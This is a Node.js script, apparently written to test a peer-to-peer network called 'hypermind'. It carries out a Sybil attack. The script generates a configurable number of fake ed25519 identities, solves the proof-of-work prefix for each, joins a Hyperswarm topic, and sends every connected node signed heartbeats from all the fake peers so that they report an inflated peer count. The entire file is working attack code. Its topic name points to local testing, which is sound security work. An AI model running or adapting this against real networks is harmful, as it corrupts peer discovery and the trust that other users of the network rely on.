const Hyperswarm = require("hyperswarm");
const crypto = require("crypto");

const TOPIC_NAME = "hypermind-test-local";
const TOPIC = crypto.createHash("sha256").update(TOPIC_NAME).digest();
const POW_PREFIX = "0000";
const HEARTBEAT_INTERVAL = 5000;

function generateFakeIdentity() {
    const { publicKey, privateKey } = crypto.generateKeyPairSync("ed25519");
    const id = publicKey.export({ type: "spki", format: "der" }).toString("hex");

    let nonce = 0;
    while (true) {
        const hash = crypto
            .createHash("sha256")
            .update(id + nonce)
            .digest("hex");
        if (hash.startsWith(POW_PREFIX)) break;
        nonce++;
    }

    return { publicKey, privateKey, id, nonce, seq: 0 };
}

function signMessage(message, privateKey) {
    return crypto.sign(null, Buffer.from(message), privateKey).toString("hex");
}

function createHeartbeat(fakePeer) {
    fakePeer.seq++;
    const sig = signMessage(`seq:${fakePeer.seq}`, fakePeer.privateKey);

    return JSON.stringify({
        type: "HEARTBEAT",
        id: fakePeer.id,
        seq: fakePeer.seq,
        hops: 0,
        nonce: fakePeer.nonce,
        sig,
    }) + "\n";
}

class SybilAttacker {
    constructor(numBots = 100) {
        this.numBots = numBots;
        this.fakePeers = [];
        this.swarm = new Hyperswarm();
        this.connections = new Set();
        this.heartbeatIntervals = new Map();
    }

    async start() {
        console.log(`Generating ${this.numBots} fake identities...`);

        for (let i = 0; i < this.numBots; i++) {
            const fakePeer = generateFakeIdentity();
            this.fakePeers.push(fakePeer);
            if (i % 10 === 0) console.log(`Generated ${i}/${this.numBots} identities`);
        }

        console.log("All identities generated. Connecting to swarm...");

        this.swarm.on("connection", (socket) => this.handleConnection(socket));

        const discovery = this.swarm.join(TOPIC);
        await discovery.flushed();

        console.log(`Connected to swarm. Maintaining ${this.numBots} peers`);
        console.log("Attack active. Check target nodes to see inflated count.");
        console.log("Press Ctrl+C to stop the attack.");
    }

    handleConnection(socket) {
        console.log(`New connection established (${this.connections.size + 1} total)`);
        this.connections.add(socket);

        socket.on("data", (data) => {
            try {
                const msgs = data
                    .toString()
                    .split("\n")
                    .filter((x) => x.trim());
            } catch (e) {
            }
        });

        socket.on("close", () => {
            this.connections.delete(socket);
            console.log(`Connection closed (${this.connections.size} remaining)`);
        });

        socket.on("error", () => {
            this.connections.delete(socket);
        });

        this.startHeartbeatForConnection(socket);
    }

    startHeartbeatForConnection(socket) {
        const interval = setInterval(() => {
            if (socket.destroyed) {
                clearInterval(interval);
                return;
            }

            for (const fakePeer of this.fakePeers) {
                try {
                    const heartbeat = createHeartbeat(fakePeer);
                    socket.write(heartbeat);
                } catch (e) {
                }
            }
        }, HEARTBEAT_INTERVAL);

        this.heartbeatIntervals.set(socket, interval);
    }

    stop() {
        console.log("Stopping");

        for (const interval of this.heartbeatIntervals.values()) {
            clearInterval(interval);
        }

        for (const socket of this.connections) {
            socket.destroy();
        }

        this.swarm.destroy();

        console.log("stopped");
    }
}

const numBots = process.argv[2] ? parseInt(process.argv[2]) : 100;

console.log(`Starting Sybil with ${numBots} peers`);

const attacker = new SybilAttacker(numBots);

process.on("SIGINT", () => {
    attacker.stop();
    process.exit(0);
});

process.on("SIGTERM", () => {
    attacker.stop();
    process.exit(0);
});

attacker.start().catch(console.error);